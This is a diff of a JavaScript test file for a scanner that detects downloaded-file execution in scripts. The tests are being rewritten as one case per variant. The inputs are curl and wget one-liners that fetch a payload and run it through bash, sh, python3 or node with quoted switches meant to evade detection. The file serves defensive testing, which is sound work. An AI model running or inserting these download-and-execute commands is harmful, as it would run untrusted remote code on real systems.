@@ -174,23 +174,23 @@ test('Codex P1: quoted env switches cannot hide a downloaded executable',()=>{
    'workflow missed unsafe quoted env wrapper: '+script+' / '+JSON.stringify(yaml));
  }
 });
-test('Codex P1: quoted interpreter switches cannot hide a downloaded file',()=>{
- for(const script of [
+for(const [i,script] of [
   "curl -fsSL "+URL+" -o payload; bash '-x' payload",
   'curl -fsSL '+URL+' -o payload; bash "-x" payload',
   "wget -q "+URL+" -O payload; sh '-e' payload",
   "curl -fsSL "+URL+" -o payload; bash '--' payload",
   "curl -fsSL "+URL+" -o payload; python3 '-u' payload",
   "curl -fsSL "+URL+" -o payload; node '--' payload",
- ]){
+].entries()){
+ test('Codex P1: quoted interpreter option variant '+i,()=>{
   const found=findingsForScript(script);
   assert.ok(found.includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),
    'scanner missed quoted interpreter switch: '+script+' / '+found);
   const yaml=audit(script);
   assert.ok(yaml.findings.some(f=>f.rule==='REMOTE_DOWNLOADED_FILE_EXECUTION'&&f.severity==='HIGH'),
    'workflow missed quoted interpreter switch: '+script+' / '+JSON.stringify(yaml));
- }
-});
+ });
+}
 test('Quoted wrapper options do not falsely condemn an unrelated local executable',()=>{
  for(const script of [
   "curl -fsSL "+URL+" -o payload; env '--' /bin/true",
